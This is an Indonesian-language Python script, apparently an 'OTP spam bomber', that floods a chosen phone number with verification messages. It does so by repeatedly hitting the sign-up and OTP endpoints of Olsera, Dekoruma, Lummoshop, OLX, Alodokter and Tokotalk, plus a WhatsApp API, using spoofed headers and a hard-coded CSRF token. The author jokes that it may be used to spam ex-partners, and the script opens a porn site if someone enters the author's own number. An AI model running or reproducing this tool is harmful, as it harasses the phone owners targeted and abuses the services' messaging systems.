#usr/bin/python3
#CODING BY UTF -8
'''
|||||||||||||||||||||||||||||||||||||||||||||||
CREATED BY XENZ
25 JUNI 2022

OPEN SOURCE!!

NOTE :
  PEMBUAT TIDAK BERTANGGUNG JAWAB
JIKA SCRIPT DI GUNAKAN UNTUK KEJAHATAN,
GUNAKAN SCRIPT INI DENGAN BIJAK,
DIPERBOLEHKAN UNTUK NYEPAM RIPER/MANTAN:v

______________________________________________
NAME   : XENZ
TEAM   : SPY CYBER TEAM
GITHUB : https://github.com/Xenz-11
|||||||||||||||||||||||||||||||||||||||||||||||
'''

#====================> MODULE <===================#
import os
import sys
import random
import time
import requests
import re
import json

from time import sleep

from rich.table import Table
from rich.console import Console
from rich.console import Group
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns
from rich.tree import Tree
from rich.progress import track
#===================> USER AGENT <================#
ua = random.choice(["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)","Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36","Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36","Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36","Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36","Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36","Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36"])
req = requests.Session()
#===================> WARNA <=====================#
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
P = '\x1b[1;97m' # PUTIH
B = '\x1b[1;94m' # BIRU
N = '\x1b[0m'    # CLEAR
NK = '\x1b[100m' # WARNA MATI
BL = '\x1b[1;90m' #BLUR
#====================> MULAI <=====================#
class mulai:
	def menu(self):
		try:
			os.system('clear')
			teks = '# WELLCOME TO SPAMER'
			teks2 = mark(teks, style='bold blue')
			Console().print(teks2, style='bold purple', no_wrap=True)


			table = Table(title=f'•••')
			table.add_column("NO.", style="bold white", no_wrap=True)
			table.add_column("          LIST", style="blue", no_wrap=True)

			table.add_row('01.',' MULAI SPAM ')
			table.add_row('02.',' INFO ')
			table.add_row('03.',' EXIT ')

			console = Console()
			console.print(table)

			while True:
				pilih = input(f' {NK}{BL}{M}● {K}● {H}●{BL}{N}{B} ')
				if pilih in ['1','01']:
					self.spam()
				if pilih in ['2','02']:
					self.info()
				if pilih in ['3','03']:
					sys.exit()
				else:
					teks = '# PILIH YANG BENER SAYANG'
					teks2 = mark(teks, style='bold blue')
					Console().print(teks2, style='bold purple')
		except ConnectionError:
			teks = '# KONESI JARINGAL TIDAK STABIL'
			teks2 = mark(teks, style='bold blue')
			Console().print(teks2, style='bold purple')
			sys.exit()
	def spam(self):
		try:
			os.system('clear')
			teks = '# MASUKAN NOMOR TARGET'
			teks2 = mark(teks, style='bold blue')
			Console().print(teks2, style='bold purple')
			no = input (f' {NK}{BL}{M}● {K}● {H}●{BL}{N}{B} ')
			if no in ['83138613993','083138613993','6283138613993']:
				teks = '# JANGAN NYEPAM AUTHOR ASU'
				teks2 = mark(teks, style='bold blue')
				Console().print(teks2, style='bold red')
				sleep(2)
				os.system('xdg-open https://www.xnxx.com/')
				sys.exit()

			teks = '# MASUKAN JUMLAH SPAM'
			teks2 = mark(teks, style='bold blue')
			Console().print(teks2, style='bold purple')
			jum = int(input(f' {NK}{BL}{M}● {K}● {H}●{BL}{N}{B} '))

			teks = '# MEMULAI SPAM'
			teks2 = mark(teks, style='bold blue')
			Console().print(teks2, style='bold purple')

			for _ in track(range(jum), description=f' {NK}{BL}{M}● {K}● {H}●{BL}{N}'):


				self.olsera(no, jum)
				self.dekurama(no, jum)
				self.lummoshop(no, jum)
				self.olx(no, jum)
				self.dokter(no, jum)
				self.tokotalk(no, jum)
				self.tokotalk2(no, jum)
				xenz = requests.get('https://xenzi-wa.herokuapp.com/api/wa',params={'phone':no}).text
				res_wa = json.loads(xenz)['result']['Message']
			teks = '# SPAM SELESAI'
			teks2 = mark(teks, style='bold blue')
			Console().print(teks2, style='bold purple')
			self.tanya()

		except requests.exceptions.ConnectionError:
			teks = '# KONEKSI JARINGAN TIDAK STABIL'
			teks2 = mark(teks, style='bold blue')
			Console().print(teks2, style='bold purple')
			sys.exit()

	def tanya(self):
		while True:
			teks = '# MAU LAGI? Y/t'
			teks2 = mark(teks, style='bold blue')
			Console().print(teks2, style='bold purple')
			lagi = input(f' {NK}{BL}{M}● {K}● {H}●{BL}{N}{B} ')
			if lagi in ['y','Y']:
				self.spam()
			if lagi in ['t','T']:
				self.menu()
			else:
				teks = '# PILIH YANG BENER SAYANG'
				teks2 = mark(teks, style='bold blue')
				Console().print(teks2, style='bold purple')

	def info(self):
		teks = '# INFORMATION SCRIPT'
		teks2 = mark(teks, style='bold blue')
		Console().print(teks2, style='bold purple')

		print ('''
AUTHOR         : XENZ
TEAM           : SPY CYBER TEAM
GITHUB         : https://github.com/Xenz-11
MY FRIENDS     : MR.SPL MR.ADIM MR.DHENZ

SCRIPT VERSION : 4.0.4
SCRIPT SPAM BRUTAL OPEN SOURCE!!
TAMPILAN MENGGUNAKAN MODULE RICH

NOTE :
	GUNAKAN SCRIPT DENGAN BIJAK
PEMBUAT TIDAK BERTANGGUNG JAWAB JIKA SCRIPT
DI GUNAKAN UNTUK KEJAHATAN.
JANGAN NYEPAM AUTHOR/PEMBUATNYA
HARGAI DIKIT YA ASU!!
''')
#======[ HEADER JAN DI UBAH  YA SAYANG TAR RUSAK ]======#

	def olsera(self,no, jum):
		head = {
		"Host": "api-dash.olsera.co.id",
		"content-length": "122",
		"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
		"accept": "application/json, text/plain, */*",
		"content-type": "application/json",
		"sec-ch-ua-mobile": "?1",
		"user-agent": ua,
		'sec-ch-ua-platform': "Android",
		"origin": "https://www.olsera.com",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.olsera.com/",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

		data = json.dumps({"name":"Xenz","email":"xenz021104@gmail.com","phone":"+62"+no,"password":"xenzganz","i_agree":"true","use_otp_type":3})
		requests.post('https://api-dash.olsera.co.id/api/admin/v1/id/register',data=data,headers=head).text

	def dekurama(self,no, jum):
		data = json.dumps({"phoneNumber":"+62"+no,"platform":"wa"})
		requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"content-type": "application/json","user-agent":ua},data=data).text


	def lummoshop(self,no, jum):
		head = {
		"Host": "api.tokko.io",
		"content-length": "306",
		"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
		"accept-language": "id",
		"sec-ch-ua-mobile": "?1",
		"user-agent": ua,
		"x-tokko-api-client": "merchant_web",
		"content-type": "application/json",
		"accept": "*/*",
		"x-tokko-api-client-version": "4.4.0",
		"sec-ch-ua-platform": "Android",
		"origin": "https://web.lummoshop.com",
		"sec-fetch-site": "cross-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://web.lummoshop.com/",
		"accept-encoding": "gzip, deflate, br"}

		data = ({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+no,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})
		requests.post("https://api.tokko.io/graphql",headers=head,json=data).text

	def olx(self,no, jum):
		head = {
		"Host": "www.olx.co.id",
		"content-length": "62",
		"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
		"x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
		"sec-ch-ua-mobile": "?1",
		"x-panamera-fingerprint": "950261aa4825ef04ca2811f8e8e0f2ed#1655354730549",
		"user-agent": ua,
		"content-type": "application/json",
		"accept": "*/*",
		"sec-ch-ua-platform": "Android",
		"origin": "https://www.olx.co.id",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.olx.co.id/",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

		data = ({"grantType":"phone","phone":"+62"+no,"language":"id"})
		requests.post('https://www.olx.co.id/api/auth/authenticate',headers=head,json=data)

	def tokotalk(self,no, jum):
		head = {
		"Host": "tokotalk-api.eks.codebrick.io",
		"Connection": "keep-alive",
		"Content-Length": "110",
		"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json;charset=UTF-8",
		"sec-ch-ua-mobile": "?1",
		"User-Agent": ua,
		"sec-ch-ua-platform": "Android",
		"Origin": "https://tokoadmin.tokotalk.com",
		"Sec-Fetch-Site": "cross-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://tokoadmin.tokotalk.com/",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

		data = ({"optional":"66a66de41820224c49920098c78482de","key":"phone","preferredMethod":"wa","value":"+62"+no})
		requests.post('https://tokotalk-api.eks.codebrick.io/v1/no_auth/verifications',headers=head,json=data)

	def tokotalk2(self,no, jum):
		head = {
		"Host": "tokotalk-api.eks.codebrick.io",
		"Connection": "keep-alive",
		"Content-Length": "110",
		"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
		"Accept": "application/json, text/plain, */*",
		"Content-Type": "application/json;charset=UTF-8",
		"sec-ch-ua-mobile": "?1",
		"User-Agent": ua,
		"sec-ch-ua-platform": "Android",
		"Origin": "https://tokoadmin.tokotalk.com",
		"Sec-Fetch-Site": "cross-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://tokoadmin.tokotalk.com/",
		"Accept-Encoding": "gzip, deflate, br",
		"Accept-Language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

		data = ({"optional":"66a66de41820224c49920098c78482de","key":"phone","preferredMethod":"wa","value":"+62"+no})
		requests.post('https://tokotalk-api.eks.codebrick.io/v1/no_auth/verifications',headers=head,json=data)


	def dokter(self,no, jum):
		head = {
		"Host": "www.alodokter.com",
		"content-length": "33",
		"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
		"accept": "application/json",
		"content-type": "application/json",
		"x-csrf-token": "39WajKwmIc7PSYUqAgbXjvATDy8og+ZRiIko6rJsJrIWB2gkU0tGfg1fNH3EQCYUxFqf8SaZbSBzYbMCirEsEw==",
		"sec-ch-ua-mobile": "?1",
		"user-agent": ua,
		"sec-ch-ua-platform": "Android",
		"origin": "https://www.alodokter.com",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.alodokter.com/login-alodokter",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6"}

		data = ({"user":{"phone":"0"+no}})
		req.post('https://www.alodokter.com/login-with-phone-number',headers=head,json=data)



if __name__ == "__main__":
	os.system('git pull')
	mulai().menu()
#=======[ INFORMATION ]=======#
#       CREATED BY XENZ       #
#=============================#

